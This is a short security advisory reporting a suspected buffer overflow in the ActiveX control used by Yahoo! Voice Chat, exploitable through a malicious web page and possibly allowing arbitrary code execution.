It has been reported that the ActiveX control used by the Yahoo! Voice Chat feature is prone to an exploitable buffer overflow vulnerability. This issue can be exploited via a malicious web page that calls the vulnerable control with malformed parameters. Although unconfirmed, it has been conjectured that this condition may be exploited to execute arbitrary code.
